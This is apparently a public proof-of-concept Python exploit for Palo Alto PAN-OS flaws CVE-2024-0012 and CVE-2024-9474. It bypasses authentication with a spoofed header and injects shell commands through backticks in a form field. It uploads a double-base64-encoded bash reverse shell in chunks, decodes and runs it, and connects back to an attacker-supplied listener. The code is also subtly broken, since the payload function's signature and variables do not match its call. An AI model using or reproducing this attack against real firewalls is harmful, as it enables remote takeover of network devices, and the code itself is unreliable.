import requests
import base64
import argparse
import time
import sys

# Global variable for target URL
TARGET_URL = None  

# Function to display a colorful and interactive banner
def display_banner():
    banner = """
████████╗ █████╗ ██╗      █████╗ ████████╗██╗   ██╗███╗   ███╗
╚══██╔══╝██╔══██╗██║     ██╔══██╗╚══██╔══╝██║   ██║████╗ ████║
   ██║   ███████║██║     ███████║   ██║   ██║   ██║██╔████╔██║
   ██║   ██╔══██║██║     ██╔══██║   ██║   ██║   ██║██║╚██╔╝██║
   ██║   ██║  ██║███████╗██║  ██║   ██║   ╚██████╔╝██║ ╚═╝ ██║
   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
         Palo Alto PAN-OS RCE Exploit by ghostxploiter
    """
    print("\033[92m" + banner + "\033[0m")
    print("\033[94m" + "[*] CVE-2024-0012: Authentication Bypass" + "\033[0m")
    print("\033[94m" + "[*] CVE-2024-9474: Command Execution and Privilege Escalation" + "\033[0m")
    for i in range(3):
        sys.stdout.write("\033[93m[*] Starting Exploit" + "." * (i + 1) + " " * (3 - i) + "\033[0m\r")
        sys.stdout.flush()
        time.sleep(0.5)
    print("\n")

# Rest of your exploit functions
def send_post_request(phpsessid, data):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "X-PAN-AUTHCHECK": "off",
        "Cookie": f"PHPSESSID={phpsessid}",
    }
    url = f"{TARGET_URL}/php/utils/createRemoteAppwebSession.php/talatum.js.map"
    response = requests.post(url, headers=headers, data=data, verify=False)
    return response

def check_vulnerability():
    print("\033[93m[*] Checking if the target is vulnerable...\033[0m")
    data = "user=`dummy`&userRole=superuser&remoteHost=&vsys=vsys1"
    response = send_post_request(None, data)
    return response.status_code == 200

def extract_phpsessid():
    print("\033[92m[*] Extracting PHPSESSID...\033[0m")
    data = "user=`dummy`&userRole=superuser&remoteHost=&vsys=vsys1"
    response = send_post_request(None, data)
    if "@start@PHPSESSID=" in response.text:
        start = response.text.find("@start@PHPSESSID=") + len("@start@PHPSESSID=")
        end = response.text.find("@end@")
        phpsessid = response.text[start:end]
        return phpsessid
    else:
        print("\033[91m[-] Failed to extract PHPSESSID.\033[0m")
        return None

def double_encode_payload(payload_b64_path):
    print("\033[93m[*] Encoding Meterpreter payload...\033[0m")
    payload = f"/bin/bash -c 'bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1 #'"
    single_encoded = base64.b64encode(payload.encode()).decode()
    double_encoded = base64.b64encode(single_encoded.encode()).decode()
    return double_encoded

def split_into_chunks(payload, chunk_size=45):
    print(f"\033[93m[*] Splitting payload into chunks\033[0m")
    chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]
    return chunks

def upload_chunks(phpsessid, chunks):
    for i, chunk in enumerate(chunks, start=1):
        temp_file = f"c_{i}.tmp"
        data = f"user=`echo {chunk} > {temp_file}`&userRole=superuser&remoteHost=&vsys=vsys1"
        send_post_request(phpsessid, data)
        trigger_command_execution(phpsessid)
    print("\033[93m[*] Uploading payload to the server...\033[0m")

def trigger_command_execution(phpsessid):
    headers = {"Cookie": f"PHPSESSID={phpsessid}"}
    url = f"{TARGET_URL}/index.php/.js.map"
    requests.get(url, headers=headers, verify=False)

def combine_chunks(phpsessid):
    data = "user=`cat c_*.tmp | tr -d '\\n' > enc.txt`&userRole=superuser&remoteHost=&vsys=vsys1"
    send_post_request(phpsessid, data)
    trigger_command_execution(phpsessid)

def double_decode_file(phpsessid):
    data = "user=`cat enc.txt | base64 --decode | base64 --decode > shell.sh`&userRole=superuser&remoteHost=&vsys=vsys1"
    send_post_request(phpsessid, data)
    trigger_command_execution(phpsessid)

def make_executable_and_run(phpsessid):
    print("\033[93m[*] Executing reverse shell...\033[0m")
    send_post_request(phpsessid, "user=`chmod 777 shell.sh`&userRole=superuser&remoteHost=&vsys=vsys1")
    trigger_command_execution(phpsessid)

    send_post_request(phpsessid, "user=`./shell.sh`&userRole=superuser&remoteHost=&vsys=vsys1")
    print("\033[92m[+] Shell executed successfully! Check your listener.\033[0m")
    trigger_command_execution(phpsessid)

def main():
    global TARGET_URL
    display_banner()
    parser = argparse.ArgumentParser(description="PoC for CVE-2024-0012 and CVE-2024-9474 (Palo Alto PAN-OS)")
    parser.add_argument("url", help="Target URL (including http or https)")
    parser.add_argument("listener_ip", help="Your IP address for the reverse shell listener")
    parser.add_argument("listener_port", help="Your port for the reverse shell listener")
    args = parser.parse_args()

    TARGET_URL = args.url

    if not check_vulnerability():
        print("\033[91m[-] Target is not vulnerable. Exiting.\033[0m")
        return
    else:
        print("\033[92m[+] Target is vulnerable.\033[0m")

    phpsessid = extract_phpsessid()
    if not phpsessid:
        print("\033[91m[-] Failed to extract PHPSESSID. Exiting.\033[0m")
        return

    encoded_payload = double_encode_payload(args.listener_ip, args.listener_port)
    chunks = split_into_chunks(encoded_payload)

    upload_chunks(phpsessid, chunks)
    combine_chunks(phpsessid)
    double_decode_file(phpsessid)
    make_executable_and_run(phpsessid)
    print("\033[92m[+] Exploit completed successfully. Check your listener!\033[0m")

if __name__ == "__main__":
    main()
